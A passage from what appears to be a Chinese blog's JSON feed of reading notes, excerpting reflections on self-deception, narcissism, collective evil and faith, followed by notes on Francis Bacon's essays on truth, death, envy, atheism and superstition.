我是否因为经验有限才觉得他的选择不够明智？“。</p>\n<p>想让别人听你的话，就要采用对方能理解的语言，想让别人满足你的要求，要求内容就不能超过对方承受的限度。最好的情谊是谦虚，不是自私和傲慢。能不时自我反省，真正看清周围的一切。</p>\n<p>人不应被情感所奴役，也不能把情感压抑的荡然无存。有时候我会告诉患者，如果感情是他们的奴隶，规矩就是管理奴隶的法律。如果我们对奴隶不加约束，我们很可能成为奴隶的奴隶。而若我们对奴隶约束过大，同样会得到暴动的潜在威胁。</p>\n<p>自由与约束相辅相成，没有约束作基础，自由带来的就不是真正的爱，而是情感的毁灭。或许，不停的自我反省，时刻考虑义务和责任，这只会把人变成清教徒。</p>\n<p>相爱的双方都不是对方的附属品，应该视其为独立的个体，永远尊重对方的独立和成长。</p>\n<p>自恋的人无视别人的存在，只把别人当成自我的延伸，他们没有感同身受的能力，从不去体会别人的感受，也不具备为别人着想的能力。</p>\n<p>他们借助你来到这个世界，却非因你而来，他们在你身旁，却并不属于你。你可以给予他们的是你的爱，却不是你的想法，因为他们有自己的思想。</p>\n<p>拥有某种信仰，就意味着要相信神灵，加入某种信徒组织，举行某种宗教仪式。如果一个人从来不去教堂，也不相信超自然的心灵，那他就没有信仰吗？我们总是错把信仰简单化和单一化。</p>\n<p>有人认为世界是没有任何意义的混沌状态，只有及时行乐才是最现实的活法？有人认为他们活在残酷无比的世界里，只有无情才能成为强者？世界有严厉的” 隐形 “法律，任何人行为不端，终将受到惩罚。</p>\n<h3 id=\"2-65\"><a class=\"markdownIt-Anchor\" href=\"#2-65\">#</a> 2-65</h3>\n<p>他们自认为笃信某种宗教，其实信仰的确是另外一种东西。</p>\n<p>似乎不做任何改变更符合我们的惰性。</p>\n<p>最有活力，最适合我们的信仰，理应从我们对现实的经验和认识中产生。经由质疑、挑战、检验的信仰，才是属于我们的信仰。</p>\n<p>在人类生存的目的与死亡的意义方面，一切二手材料我都无法接受，我不可能依靠对” 二手上帝 “的” 二手信仰 “来生活。我要想真正的活着，就必须拥有自己的语言，拥有独一无二的怀疑和挑战的意识。</p>\n<p>你的信仰所具有的力量，使你敢于承受一切痛苦，一切摆脱既往经验和迎接未来的痛苦。你所做的一切，都是为了你的信仰。</p>\n<p>过分信仰上帝，容易使我们更加教条。在信阳值牌的背后，曾隐藏着无数为善的嘴脸。尽是物质，迷信，教条和僵化，真正的信仰却少的可怜。在相当多的情况下，上帝不是来生的期许，反而是今世的毒药。也许，上帝是心灵的幻象–一种具有破坏性的幻象。</p>\n<p>其实不我想回到过去，但是有时候，我还是怀念过去。至少，就某些方面来说，我可以不费多少力气，让一切变得简简单单。</p>\n<p>教会只想让信徒们原封不动地继承上一代人的信仰观念。</p>\n<p>一切对立的，原始的，冗余的，怪异的事物，世界变化多端，万象汇集，谁又能领悟其中真谛？人生某些痛苦原本就是难以避免的，生命原本就是矛盾而庞杂的组合。</p>\n<p>我想我仍在以某种方式，有意隐藏自己的秘密。</p>\n<p>相信科学，相信世间万物总能被解释，科学何尝不是教条主义。</p>\n<p>人类有潜在的欲望和愤怒，是自然而然的事，本身并不构成什么问题。只有当意识不愿面对这种情形，不愿承受处理消极情感造成的痛苦，宁可对其视而不见，甚至加以摒弃和排斥时，才导致了心理疾病的产生。</p>\n<p>我们总是在它们经过眼前时没有认识到它们的价值。</p>\n<p>那些人为不理解的潜意识指示，尽管它们可能或多或少受到意识影响，但它们的根源位于意识和主观思维之处。</p>\n<h3 id=\"2-66\"><a class=\"markdownIt-Anchor\" href=\"#2-66\">#</a> 2-66</h3>\n<p>人类总是更愿意把事物理解为具有实质的存在。</p>\n<p>必须同自然法则对抗，跟循规蹈矩的自然倾向背道而驰。但遗憾的是，我们却习惯于保持现状，热衷于使用陈旧的地图与方法；我们习惯于走平坦的道路，害怕道路上荆棘遍布。在反抗自然法则的过程中，心灵需要同熵的力量对抗，就如同生物进化一样，不断抵抗着熵的法则。</p>\n<p>我们产生幻灭感，是因为我们对于世界的期望远远高于上一代人。</p>\n<p>我们不能通过回避问题来得到答案。</p>\n<p>上帝想让我们成为他自己。我们成长的方向就是变成上帝，上帝不仅是推动进化的力量，而是进化本身的目标。神学典籍里上帝既是开始又是结束的说法，含义就在于此。</p>\n<p>总是逃避必要的痛苦，选择平坦的道路，是我们的惰性使然。</p>\n<p>人世间充斥着罪恶、欺骗、偏见、折磨与残暴，可在婴儿身上，谁能看到原罪。</p>\n<p>懒惰的一个主要特征就是恐惧感，要解决所有的问题，首先要承认懒惰的存在，认清真实的懒惰。</p>\n<p>我们都是平等的，人人都有两个自己，一个是病态的，一个是健康的。一个走向生存，一个走向死亡。我们每一个人，其实都足以代表整个人类，在每一个人的身体里，都拥有着向往神性的本能，都有达到完美境界的欲望，同时也都有着懒惰的原罪。无所不在的熵的力量，试图把我们推回到人类进化的初起–那里有我们的幼年，有母亲的子宫，还有荒凉的原始沼泽。</p>\n<p>魔鬼本能的憎恨光明，它们逃避光明，也企图消灭光明。</p>\n<p>真正的邪恶者却主动逃避自我完善，捍卫自己的懒惰，保持病态的自我。</p>\n<p>政治的力量，就是以公开或隐秘的方式，去强迫别人遵循自己的意愿。这种力量既存在于权力之中，也存在于金钱之中。</p>\n<p>我们作出决定时，有时甚至不知道自己在做什么，我们采取某种行动，却不了解自己的真实动机。我们也无法看清，自己的选择会造成什么样的后果。</p>\n<p>天下诸事难遂人愿，命运总是喜欢同我们开玩笑。</p>\n<p>我们趋向于逃避一切痛苦和折磨，因此对某些消极现象可能熟视无睹，对残酷的现实可能不闻不问，我们的目的只是在捍卫自己的意识，不让真实的信息侵入其中，称为意识的防卫机制。</p>\n<h3 id=\"2-67\"><a class=\"markdownIt-Anchor\" href=\"#2-67\">#</a> 2-67</h3>\n<p>他没有归咎于上帝或者命运，局面是自己造成的，我们得自己付出努力洗刷罪过。</p>\n<p>被召唤者众多，被选中者廖廖。</p>\n<p>熵的原罪存在于每一个人身上，它的力量故意促使我们对抗治疗。</p>\n<p>我们渴望摆脱束缚和乏力的状态，拥有成年人的自由和力量，但是成年人应当具有的责任，应当遵循的规矩，却让我们感到乏味甚至恐惧。</p>\n<p>你听见风的声音，却不知他从哪里来，又要往哪里去。</p>\n<h3 id=\"2-100\"><a class=\"markdownIt-Anchor\" href=\"#2-100\">#</a> 2-100</h3>\n<p>不解决真相中存在的问题，那些问题就会永远存在并折磨你，直至心灵出现问题。</p>\n<p>他不想让这些荒谬的恶念扰乱自己正常的生活，但另一方面，他又担心这不是无中生有，害怕因自己一时的疏忽造成一生的遗憾。</p>\n<p>就算这一次他确认之后又是安然无恙，但难保下一次荒谬的念头不会出现。难道每一次都要回到现场去确证吗？</p>\n<p>似乎冥冥之中有一股强大的力量逼着我去胡思乱想，强迫我半夜起床回到现场求证。你知道吗？我真的是被逼着去的，我身不由己，我根本没法控制自己。就因为这样，我每天的睡眠时间被无情地剥夺了，内心彻底在交战。</p>\n<p>太执著于探究自己表面的病念，却没有花时间去思考导致这些症状的根本原因。如果能够走出迷雾，勇敢地正视自己的生活，不再用谎言掩盖自己，真诚地对待生命和死亡，我想一切会好起来的。</p>\n<p>你确实应该感到罪恶，因为你的所做所为，的确是有罪的。</p>\n<p>如果对于一件正常的事，你竟然感到罪恶，那完全没有必要，甚至别人会认为你有病，但如果你对于一件恶事，丝毫感觉不到一丁点罪恶，那也是不正常的。</p>\n<p>乔治，我基本可以肯定，你其实是一个懦夫。你每次遇到问题和痛苦，都不敢去正视，只知道用谎言欺骗自己。你不愿采取行动，甚至连想都不愿去想，只会选择逃避。然而，这些事情并不是你想逃避就能逃避得到的，它们会以病症、妄想和强迫行为的方式来纠缠你，折磨你。</p>\n<h3 id=\"2-101\"><a class=\"markdownIt-Anchor\" href=\"#2-101\">#</a> 2-101</h3>\n<p>自己的问题，必须自己解决，任何人都无法包办代替，你不解决问题，你就会终日为问题所困扰。你的一切行为都是在想方设法逃避问题和痛苦，而不是勇敢去面对。</p>\n<p>如果说，魔鬼确实潜伏在人类的身旁，专门搜集那些被出卖的灵魂，我敢肯定，他一定会专从那些懦弱的人身上下手。他们身不由己，一心想要把自己的问题和痛苦交给别人。</p>\n<p>用玩世不恭来形容你，再恰当不过了。你喜欢把自己伪装成一个什么都不在乎的人，总是试图寻常轻松和毫不痛苦的方式来解决问题。一旦面对正确和轻松二选一的抉择时，你会毫不犹豫的选择后者。</p>\n<p>如果愿意去正视现实生活中的问题，纵使有百般痛苦，万般无奈，你都必须咬着牙挺过去。如果只是一昧地寻求捷径，暂时舒缓痛苦，那跟死人又有什么区别。</p>\n<p>自己的多愁善感，每当面对季节的更替、世事的无常时，都会感到自己的脆弱和悲伤。</p>\n<p>邪恶就是用谎言维护病态的自己，由此积聚的一股企图扼杀生命力或活力的力量。所谓病态的自己，就是被谎言包裹着的自己。</p>\n<p>他所遭遇的事情，远远超过他的承受能力，他难免变得忧郁。</p>\n<p>受父母虐待的孩子，通常会假定自己就是坏小孩，在恶俗的观念下耳濡目染长大的孩子，会根深蒂固的保有恶俗的本性。严重缺乏父母关爱的孩子，不敢去承认父母不爱他们的事实，他们会逃避事实，用谎言欺骗自己，把问题的根源归结到自己身上。然而，他们逃避的越多，心理堆积的郁结就越多，最后他们会以不合理的自我负面形象，来抗议现实。</p>\n<p>有无数心理疾病患者，分明已经到了刻不容缓的地步，却仍然坚持认为没有接受治疗的必要。</p>\n<h3 id=\"2-102\"><a class=\"markdownIt-Anchor\" href=\"#2-102\">#</a> 2-102</h3>\n<p>一旦病人满脑子都是偏见，说谎成性，那么再怎么接受治疗，恐怕也是回天乏术了。撒谎成性的人根本无需被打入任何一层地狱，因为活着的时候，他们已经受尽了人间的炼狱。</p>\n<p>对自己不诚实，本身也是一种罪。承认自己的罪虽不好受，有时甚至痛苦万分，但它可以让我们避免沦为罪大恶极。撒谎成性的人不会心平气和的忍受痛苦。事实上，他们连忍都不想忍，恶性一旦生起，他们就经不起任何磨练。</p>\n<p>傲慢是撒谎成性之人最显著的特征，他们不承认自己有罪，去寻找代罪羔羊。在内心深处，他们害怕面对自己的罪行，容不得自己受人责难，唯恐颜面尽失。于是，他们会恶毒的攻击责备他们的人，或者牺牲他人以保存自我形象。</p>\n<p>一旦撒谎成性之人与社会产生了冲突，他们免不了会将一切责任归咎于社会。因为他们一定不敢承认自己的恶，所以他们必定会将自己的恶加诸于社会，视别人为恶，而忽视了自己本身的恶。</p>\n<p>他们常假借正义之名，去消除他们不完美的证据。由于不敢面对自己的不完美，他们撒谎成性掩盖真相。他们对于社会及他人保持高度的敏感。</p>\n<p>道貌岸然的人，他们缺乏善良的本性，但他们却极力想要表现出善良的样子。事实上，他们的善良全是伪装出来的，他们虚伪、懦弱，谎话连篇。</p>\n<p>他们拒绝承受良知的谴责。很多人因为试图隐瞒，遮掩，逃避真相，而开始撒谎，逐渐变得邪恶。撒谎成性之人也是如此，他们不是直接行恶，而是采用迂回间接的方式，打着正义的旗帜，干着罪恶的勾当。因此，恶并不是源于有罪，而是始于想象逃避自己有罪。</p>\n<p>神学家认为，邪恶是自由意志下的产物。上帝以他的形象创造了人类，并赐予人类自由的意志，以及选择善恶的权力。进化论的非宗教性篇章中，也提到了恶衍生的问题，即进化程度较低的生物多被本能左右。</p>\n<p>布伯认为，恶性自恋者都坚持着一种” 完全脱离实际的主张 “。他们固执的认为自己把一切都做的很好，实则不然。他们在正常的自我欣赏的基础上，距离真的自我越来越远，越来越以一种肆意的意志形态，和谎言去编造一个并不真实的自我。</p>\n<h3 id=\"2-103\"><a class=\"markdownIt-Anchor\" href=\"#2-103\">#</a> 2-103</h3>\n<p>我们又不是心理学家，怎么会预先想到这些事情呢？我们只做我们认为对的事。</p>\n<p>它不是一件物品，而是一个生命，它有权知道与自己有关的任何事。</p>\n<p>邪恶的本质是用谎言维护病态的自己。</p>\n<p>真正的撒谎成性却很少这么赤裸，它通常看起来普通，表面上正常，甚至让人觉得理所当然。他们都擅常伪装，他们会故意地对别人说，甚至是对自己隐藏最真实的面貌。</p>\n<p>恶人可以分为” 逐渐堕落的恶人 “和” 已经堕落的恶人 “。</p>\n<p>在灵魂的晦暗深处，孤单的灵魂在不可思议的捉迷藏游戏中，自觉的闪避，躲藏。</p>\n<p>所谓的被动，指的就是懒惰，缺乏行动力–只会接受，不会行动；只是随波逐流，不会勇敢的探索；这个词也可以用依赖，幼稚和懒惰替代。成年后的我们，并不是因为我们受尽了命运的压迫而不得不跳入恶势力的陷阱，而是因为我们自己挖陷阱给自己跳。</p>\n<p>为了维持表面的和谐，总是在意识中欺骗自己。</p>\n<p>没有勇气去面对自己的痛苦，害怕自己编织出来的谎言被拆穿，害怕虚伪的那一面在外界与自我面前无处藏匿。不管撒谎成性之人在日常的行为处事中表现得多么镇定自若，但他们的内心却时时刻刻处于恐惧之中。它慢性的侵入的苦难，在身体里蔓延，却令人浑然不觉，而他们无孔不入的自我欺骗也会阻止他们正视自我。</p>\n<p>疾病是身体或性格结构中，阻碍人类实现潜能的种种缺陷。</p>\n<p>撒谎成性的人还存在以下特点：习惯于别有用心地找人替罪，而这些行为又往往另人琢磨不透。难以接受他人对自己的批评，且极度不服他人对自己自恋的伤害。很重视自己的公众形象，极力的维护唯我独尊的形象，一方面追求稳定的生活，一方面又心存恶念，蓄意报仇。在压力面前思维混乱。</p>\n<p>因为黛西不能忍受独处，无法静静地一个人等待理想情人的到来。她认为，只要是近在眼前的男人，就是他谈情说爱的对象。</p>\n<h3 id=\"2-104\"><a class=\"markdownIt-Anchor\" href=\"#2-104\">#</a> 2-104</h3>\n<p>借以某种行为，使自己的行为合理化，总是在同样的问题上反复纠缠，不断挣扎，丝毫看不见任何曙光。</p>\n<p>恐惧症其实是一种转移作用，是人们把自己对某件事物的恐惧和反感，转移到其它事物上的表现。人类因为不愿意承认原始的恐惧感和反感，就产生了这种防卫性的转移机制。</p>\n<p>所谓心灵的谎言，是指甚至连撒谎者自己都意识不到自己在撒谎，撒谎者的潜意识将他们的意识蒙蔽、欺骗的谎言形式。这股邪气使他们不择手段的去维护病态的自我。</p>\n<p>她坚持保持这种不坦诚相对，蓄意隐瞒的应付方式，大概就是为了控制局面。我对她了解的越深，就对她那令人费解的本质，越感生畏。</p>\n<p>撒谎成性之人总是提出脱离事实的要求，并坚持自己的主张。若无例外，她的要求是无法实现的。</p>\n<p>在某些特定的时刻，人必须暂时压制自己内心的欲念，顺应那些层次较高的意志，只有这样，才能更好的适应社会。对教徒而言，这个层次较高的意志就是上帝的旨意。</p>\n<p>“我” 的机器是美的化身，它精细复杂的结构令人叹为观止，它所具备的功能无所不包。它是我奇思妙想的结晶，是在我极小心的谨慎的情况下，付出巨大心血建造而成的。这台及其有许多操作仪器和部件，可以算得上是一项伟大的工程，它不应该被毁掉。</p>\n<p>雪莉，你唯恐天下不乱，到处制造混乱不安，以前，你总是把这一切归结于意外，但是我现在发觉这些纷扰不安往往是你故意制造的。</p>\n<p>雪莉的生活被那些无知、无聊且无意义的琐事所充斥。</p>\n<p>喜剧就是把没有价值的东西毁灭给人看。</p>\n<h3 id=\"2-105\"><a class=\"markdownIt-Anchor\" href=\"#2-105\">#</a> 2-105</h3>\n<p>她那茫然无知，强作镇定的面具背后，掩藏了不为人知的恐惧。</p>\n<p>撒旦本身并没有力量杀人，或者危害他人，它必须利用人类心灵的谎言才能去行凶。</p>\n<p>心理疾病是由于人出于某种原因不断出卖自己所致，而出卖自己的原因都是由于寂寞难耐，心中充满了恐惧和痛苦。</p>\n<p>逃避问题和痛苦是人类的天性，每个人都不愿意去直面内心的阴暗和痛苦。加入集体之后，他们便可以逃避面对自己的痛苦，把自己的责任全交给集体。如果这时集体陷入了谎言之中，他们为了维护这一谎言，就会不由自主地去干坏事或恶事，从而变得邪恶起来。因为在集体之中，个人往往会依附于集体，将自己的道德责任推诿到集体或其他成员身上，从而逃避自己的责任。</p>\n<p>集体在一定意义上，就是一个可以逃避问题和责任的地方。也是一个可以纵容自己内心谎言的地方。如果说单独的个体还知道自己不易的话，那么，集体内的个体则容易对于自己的行为缺乏基本的判断力。所以，在集体中，个人的心智极容易退化，极容易对自己的过错和罪行浑然不知。</p>\n<p>凡是陷入长期痛苦不安的人，几乎都会产生一种退化，即心理开始逆向成长，舍弃成熟的人格，短时间内变得非常幼稚。</p>\n<p>人类处于痛苦或不愉快的情绪中难以自拔时，就会建立起自我麻痹的心理机制。这一道理很简单，当我们偶然看到一具血淋淋的尸体时，一定会战栗不已，但如果每天都看到这样的尸体横陈脚下，恐惧感就会因为习惯而降低。于是，我们就会对尸体无动于衷，对于血腥视而不见，对于恶臭嗅而不闻，对于痛苦浑然不觉–这些都是我们在潜意识中自我麻痹的结果。换句话说，就是我们都生活在了谎言之中。</p>\n<p>在集体中，个体被弱化，而集体则拥有了强大的权力。其权力称之为集体凝聚力，是一股强而有力的力量，它让各组成分子结合为一体，行动一致。</p>\n<p>当个体面对那些可能彰显他们的缺点的人或事时，为了逃避自责或内疚就很可能从谴责或摧毁等各种方式作出恶行。</p>\n<p>逃避现实战争痛苦和压力的个体谎言和维护集体虚假荣誉的谎言叠加在了一起，在集体中步调一致，产生了共鸣，从而形成了一种集体性谎言，这种集体谎言加上集体强大的凝聚力，便构成了最大的邪恶，具有毁灭一切的力量。</p>\n<h3 id=\"2-106\"><a class=\"markdownIt-Anchor\" href=\"#2-106\">#</a> 2-106</h3>\n<p>人生活在社会中，与生俱来需要一份自我存在的价值感，渴求自己的才能被需要、被认可。反之，一无是处及不被不需要的绝望感，则比任何感受都令人痛苦。太平盛世时，军人不受重视，他们往往如可怜的寄生虫，在政治体制下苟延残喘，但是到了战争时期，军人则变得炽手可热。</p>\n<p>人的观念具有某种惰性，这种惰性是指人一旦形成某种观念和思维模式，便不愿去改变。观念的惰性并不等于行为上的惰性，相反，在既有观念的指挥下，人一旦行动起来便会奋不顾身，即使错误昭然若揭地摆在眼前也绝不退却。这时候，错误的观念其实就构成了谎言，人之所以将错就错，就是因为惧怕改变观念，那将承受极大的痛苦。</p>\n<p>小至个体，大至国家，他们之所以会固步自封，不仅因为改变意味着痛苦，也是因为恶性自恋使他们不愿意相信自己的观念和想法是错误的，更不愿由此忍受自我并不完美的现实。一般人只在表面上声称自己并非无过，但是在骨子里却认为自己永远是对的。</p>\n<p>对于一般人来讲，当证据呈现在眼前时，他们往往能够忍受住自我形象受挫折的伤痛，承认自己确实有改变的需要，并修正自己的见解。但是整个国家恶性自恋的程度却远远超过个体，在面对真凭实据时，他们不但没有勇气自我批评，反而会设法去摧毁证据。他们这么做的目的就是为了维持谎言，维持谎言背后自我虚幻的完美。</p>\n<p>我们从来没有想过这样的教育会导致多么荒谬可笑的结果，因为这种以自我中心的恶性自恋，一旦在国家民族自尊等合理化的外衣下滋长，就可能根深蒂固，不可动摇。而一旦有某种力量要撼动这种病态的信念，那么战争就随之而来。</p>\n<p>身处群体之中，不要自然而然的将自己的道德判断交托至领导人手中，每一个人都有作出道德判断的权利和义务，也有为了做出正确的道德判断而净化自己的心灵的责任。</p>\n<p>经常且不断地将注意力集中在邪恶上，往往会给自己带来伤害。</p>\n<h3 id=\"2-107\"><a class=\"markdownIt-Anchor\" href=\"#2-107\">#</a> 2-107</h3>\n<p>平凡，最不起眼的邪恶。过去，我们将心智健全与正义感，人情味，慎思明辨，爱的包容力及善解人意画上等号，并依赖心智健全的人使这个世界脱离野蛮，远离疯狂及毁灭。但如今，我们渐渐明白，正是这些头脑清楚，神志清楚的人研发成功了导弹，并按下足以毁灭世界的按钮。</p>\n<p>当忠心耿耿，赤诚的牺牲者代替背叛者而死时，圣桌将碎裂，死神的力量也开始退化。</p>\n<p>爱不是花前月下，不是温情脉脉，不是坠入情网，爱一个人就要让她独立。</p>\n<p>避免简单化的思考，放弃以偏概全的冲动，不要去寻找公式和简单的答案。</p>\n",
            "tags": [
                "成长",
                "人生哲学"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/30%E3%80%8A%E4%BA%BA%E7%94%9F%E8%AE%BA%E3%80%8B%E5%BC%97%E6%9C%97%E8%A5%BF%E6%96%AF%C2%B7%E5%9F%B9%E6%A0%B9/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/30%E3%80%8A%E4%BA%BA%E7%94%9F%E8%AE%BA%E3%80%8B%E5%BC%97%E6%9C%97%E8%A5%BF%E6%96%AF%C2%B7%E5%9F%B9%E6%A0%B9/",
            "title": "《人生论》弗朗西斯·培根",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>他们就好像是无生命的塑像和器械一般，只是被习惯的轮子给推动着。</p>\n<h3 id=\"3-73\"><a class=\"markdownIt-Anchor\" href=\"#3-73\">#</a> 3-73</h3>\n<p>有这样一些人，他们乐于变化无常，并且认为确定一种信念就是蒙受一种束缚，因而不但在行动上，而且在思想上，他们都以获得自由意志为目的。真理一旦找到，也就对人们的思想产生了影响，而是在于，人们对谎言自身有一种天生的、尽管是堕落的爱。</p>\n<p>真理是赤裸裸而不加掩饰的目光，在这种目光中上演着假面剧，哑剧和世上的凯旋式，远不及在烛光中壮观和高雅。</p>\n<h3 id=\"3-74\"><a class=\"markdownIt-Anchor\" href=\"#3-74\">#</a> 3-74</h3>\n<p>造成伤害的，并不是在头脑中经过的谎言，而在头脑中落下并安顿起来的谎言。无论这些事情是怎样存在于人们的堕落的判断和感情之中，然而真理，只在于判断本身。</p>\n<p>站在岸上看船只在海上颠簸是一件乐事，站在城堡的窗口看下面的战斗以及其中的冒险也是一件乐事，但语无伦比的乐事，则是站在真理的有利地位上。</p>\n<p>把死亡看作是罪孽的报应和通往另外一个世界的旅程，是圣洁而虔诚的，而把死亡看作应向大自然进贡的贡品而惧怕之，则是软弱的。</p>\n<p>使人们害怕的，是死亡的装饰品，而不是死亡本身。</p>\n<p>一个人尽管可能并不勇敢，也不幸运，但仅仅是因为对反复做同一件事情感到厌倦，也会想死去。</p>\n<p>过去的事情已经过去了，不可挽回了，而明智的人则是有足够的事情要做，来处理当前和将来的事情，因为那些为过去的事情而苦恼的人们，也就只不过是把自己当儿戏而已。</p>\n<p>如果有人纯粹因为心眼坏而作恶，那又怎样？那只不过就像荆棘或者蔷薇一般，它们之所以刺戳抓搔，是因为做不了别的事情。</p>\n<p>所谓奇迹，即超越自然，而在人来说，身处逆境之时，能控制自己的自然亦即天象，也就出现了奇迹。</p>\n<p>凭借着目光的欢乐来判断心中的欢乐吧。无可否认，美德就像名贵的香料，在燃烧或者碾碎的时候才最为芬芳；顺境最能显示邪恶，但逆境却能显示美德。</p>\n<p>什么事情应该公开，什么事情应该隐藏起来，什么事情应该展现的若隐若现，而且是向谁和谁展现，的确是一种治国之术和处世之术。</p>\n<p>作伪就是一个人有目的地和明确地毛状和假装成为并非他本人的那个人。</p>\n<h3 id=\"3-75\"><a class=\"markdownIt-Anchor\" href=\"#3-75\">#</a> 3-75</h3>\n<p>饶舌者和易泄密的人，他们通常轻率且轻信，因为言其所知的人，也会言其不所知。所以，一种保密的习惯既是明智的，又是有道德的。</p>\n<p>如果一个人动机公开的话，那就等于发出了警报，把所有反对他的人都召集了起来。一个人若是用明了的宣告把自己给约束起来的话，他就必须或者是成功，或者是垮台。</p>\n<p>作伪与掩饰使得许多人在思想上困惑茫然，而否则的话，他们也许是会和他们合作的，因而作伪与掩饰使得一个人几乎是独自走向他的目的地。</p>\n<p>父母不可过分专注于子女的意向，以为他们最想做的事情，子女也会最喜欢。如果子女的爱好或者是倾向性非常寻常的话，那么最好不要否认他。</p>\n<p>有妻子儿女的人，也就等于向命运女神送去了人质。</p>\n<p>独身的最为通常的原因却是自由，这在某些自鸣得意的古怪的人身上尤其是如此，这些人对每一种约束都极为敏感，以至于几乎会认为他们的腰带和丝袜也成了镣铐枷锁。</p>\n<p>年轻的时候还不应该结婚，年老的时候根本不应该结婚。</p>\n<p>人们的心思或者是以自己的美德为精神食粮，或者是以别人的不幸为精神食粮，而且缺乏美德的人，也就会捕食到别人的不幸。不论是谁，如果没有希望获得另一个人的美德的话，他就会压抑另一个人的幸福，以期取得平衡。</p>\n<p>那些人，能够得到权力和职务，是什么代价也肯付出的。</p>\n<p>嫉妒是最纠缠不休的和最从不间断的，嫉妒没有假期。它是一种最卑鄙的感情，也是最堕落的感情。</p>\n<p>好像生来本当注视天空和一切高尚的对象的人，竟只会跪在一个小小的偶像面前，使自己成为一个臣服者，尽管不是受制于嘴，却也是受制于眼睛，而之所以给他眼睛，本来是为了更为高贵的目的。</p>\n<h3 id=\"3-76\"><a class=\"markdownIt-Anchor\" href=\"#3-76\">#</a> 3-76</h3>\n<p>无可否认的是，情人是最大的阿谀奉承者。因为再骄傲的人，在情人面前，看好自己到了滑稽可笑的程度。又要恋爱又要明智是不可能的。</p>\n<p>爱的报偿要么是回报，要么就是内心秘而不宣的轻蔑。人们应该提防这种激情，因为它不仅会失去别的东西，还会失去激情本身！</p>\n<p>居高位者是三重意义上的奴仆：君主或国家的奴仆、名声的奴仆、事业的奴仆，因为他们没有自由，即没有个人的自由、也没有行动、时间上的自由。</p>\n<p>职位的升迁是费力的，而人们吃尽了辛苦。却又获得了更大的辛苦；职位的升迁有时是可鄙的，人们是通过有失尊严的手段而成了显贵要人。</p>\n<p>当你不再是昔日之你的时候，那就再也没有活下去的理由了。</p>\n<p>大人物需要借用别人的见解，才能以为自己是幸福的，因为如果他们靠自己的感觉来判断的话，他们是找不到的。身居高位的人，不能认识自己，在忙于事务的时候，他们既没有时间去照顾他们身体的健康，也没有时间照顾他们精神的健康。</p>\n<p>死的时候举世皆知其为人，唯独自己不认识自己，那么他的死就是沉重的死。</p>\n<p>公德与善行是人的活动的目的，而意识到自己做出了功德与善行，也就是人的安息的完成。</p>\n<p>像在自然界一样，事物再向他们的位置移动的时候，是剧烈的，而待在他们位置上的时候，则是平静的，美德亦然，在怀有雄心壮志的时候，美德是狂暴的，而在掌权的时候，美德则是安定而平静的。</p>\n<p>一般来说，在人性中愚蠢的东西要比明智的东西要多。因而那些能够支持人们头脑中的愚蠢的部分的才能，也就是最有力量的。</p>\n<p>大胆总是盲目的，因为它看不见危险和不便之处。劣于判断，擅于执行。</p>\n<p>把善称之为习惯，把性善称之为倾向。若是没有它，人就是一个焦躁不安、有害的、可怜的东西，简直是一种害虫。过度追求权力的人使天使堕落，过度追求知识的欲望使人堕落。</p>\n<h3 id=\"3-77\"><a class=\"markdownIt-Anchor\" href=\"#3-77\">#</a> 3-77</h3>\n<p>基督教的信念使好人成了那些专横而又不公正人的牺牲品。</p>\n<p>在民主国家里，人们的目光是落在工作上，而不是落在人的身上：即使是落在一个人的身上，那也是为了看他们是不是最合格，而不是看他们的门第和血统。</p>\n<p>固然少量的哲学知识使人的头脑倾向于无神论，但在哲学上的深刻探讨，却使人的头脑产生宗教。</p>\n<p>如果人只把他的头脑指向事物和现象的直接原因，而没有看到他们之间是什么关系，他就会感到满足而不进一步思考。但如果他看到有一连串的原因，而一个原因又是另一个原因的原因的话，那么他就会随着那一串原因追溯回去，最后来到那个初因，也就是上帝或神。</p>\n<p>无神论者在谈到无神论的时候总是说那是他们的见解，好像他们自己在里面昏厥了，因为乐意用别人的赞同来给自己力量似的。</p>\n<p>无神论像别的教派一样，也在努力吸收门徒。</p>\n<p>真正亵渎神灵的，并不是否认世俗的神，而是把世俗的信念用在神的身上。</p>\n<p>凡是抨击一种被普遍接受的宗教或者迷信的人，都被敌对方加上污名。</p>\n<p>名副其实的无神论者确实是伪君子，他们老是论及神圣的事情，但却不带感情。这样以来到最后他们一定是会麻木不仁的，最主要的形成原因，是在神圣的事务中进行亵渎神灵的嘲弄的风气。</p>\n<p>人在肉体上跟野兽相类似，如果他在精神上不与上帝相近的话，他就是一个卑贱下劣的野兽了。对于人来说，当他为神的保护和恩惠所支持并感到放心的时候，他就会聚集在一种人性在自身所不能获得的力量和信念。这在个人是如此，在民族也是如此。</p>\n<p>无神论把人交给辨别力、交给哲学、交给合乎常情的孝敬，交给法律、交给好名之心。即使没有宗教，所有这一切也会引导人们获得一种外表上的道德美德。但迷信却把这一切都去掉了，并在人们的头脑中树立一种绝对的专制统治。所以无神论者从未扰乱过国家，因为无神论使得人们对自己小心，而这又是因为人们不能看得更远。</p>\n<h3 id=\"3-78\"><a class=\"markdownIt-Anchor\" href=\"#3-78\">#</a> 3-78</h3>\n<p>迷信的主人是人民，在一切迷信中，聪明的人是跟着愚蠢的人走的，而且争论是以一种颠倒的顺序来适应于常规工作的。</p>\n<p>迷信的原因是：令人高兴而又给感官以快感的礼节和仪式；过分的外表上和形式上的神圣，对只能使教会承受重压的传统的过度尊敬；高级教士为了个人的野心和金钱利益而使用的策略；对良好用心的过度偏爱，而那些良好用心又打开了通往别出心裁的想法和新奇事物的大门；以人间的真理来猜测神圣的事物，而这又只能造成概念上的混乱；最后，那就是野蛮的时代，尤其是在野蛮的时代与不幸和灾难结合在一起的时候。</p>\n<p>正如有益于健康的肉如果腐烂就会生虫一样，好的形式和规程如果腐败的话，那么也会变成若干琐碎的仪式。如果人们以为离开原先接受的那种迷信越远越好的话，那么在避免迷信的时候，也会产生出另外一种迷信。</p>\n<p>他们因为位及至尊，也就没有什么渴望得到的，这就是使他们的精神要更加萎靡不振，他们又看到有险情、有阴影的许多表现，这又使得他们更心神不宁了。因为不管是谁，如果他有大量的猜妒，但又缺少某个占主导地位的欲望来约束别的一切并使之有条不紊，那么他的心也就难以测度。</p>\n<p>人的精神更因在小事上获益而振奋和振作，绝不是大事上。</p>\n<p>习惯于进取的人，如果停顿下来的话，也就不免要自轻自贱，非复故我了。</p>\n<p>只有在先前受到伤害或者挑衅的情况下，所进行的战争才是正义的。如果没有受到打击，但对频临的危险有根据的恐惧，也是进行战争的正当理由。</p>\n<p>他们的平民百姓。除非他们有了不起的有力的首领，